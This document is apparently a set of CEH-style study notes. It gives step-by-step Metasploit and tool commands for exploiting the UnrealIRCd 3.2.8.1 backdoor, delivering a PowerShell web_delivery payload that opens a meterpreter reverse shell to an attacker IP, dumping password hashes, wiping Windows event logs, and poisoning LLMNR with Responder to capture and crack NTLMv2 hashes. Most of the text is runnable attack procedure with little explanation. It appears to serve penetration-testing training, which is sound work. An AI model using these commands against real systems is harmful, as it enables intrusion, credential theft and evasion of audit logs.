#### Exploiting UnrealIRCd 3.2.8.1 backdoor command execution
```bash
# Scan target IP and detect version on port 6667 using nmap.
nmap <metasploitable2IP> -p 6667 -sV
-> msfconsole
-> search UnrealIRCd
-> use 0
-> Show optons -> set RHOSTS
-> show payloads -> set payload 6 (payload/cmd/unix/reverse)
-> set ip and port -> run
```
#### Client Side Exploitation:
#### HTA_SERVER
#### Html Application Server
→ In this Exploitation: Target will not have any vulnerability, we deliver the some file and gain access.
#### Commands
```bash
new terminal
msfconsole
search web_delivery
use exploit/multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
show options
set LHOST 192.168.0.110
show targets
set target 2
show options
exploit -j
> copy & paste the PSH code in windows 7 powershell x86 (run as admin) & hit
enter
> comeback to msfconsole terminal & hit enter
sessions
sessions -i 1
> sysinfo
> hashdump 
```

#### Clearing tracks
```bash
Windows
clearev -> Clears all logs from Event viewer

Unix
In linux, the logs are stored in   /var/log
```
#### Responder tool
```bash
sudo responder -I eth0
→ Responder starts listening to the network interface for events.
open target -> Win+R --> \\CEH\Tools
now return to parrot sec
By default, Responder stores the logs in /usr/share/responder/logs
copy hash
save as hash.txt
john hash.txt
- The victim mistyped `\\CEH-Tools` → Triggered LLMNR/NBT-NS.
- Responder poisoned the response → Tricked the victim into sending an NTLMv2 hash.
- The attacker captured the hash for offline cracking or relay attacks.
```
#### Domain Controller IP 
```bash
Assume that 10.10.1.22 is a machine

nmap shows that host 10.10.1.22 has port 88/TCP kerberos-sec and port 389/TCP LDAP opened which confirms that our DC IP address is 10.10.1.22.
And to find the FQDN (Fully Qualified Domain Name)

`nmap -A -T5 10.10.1.22` → Gives Product version, FQDN and many other.
```
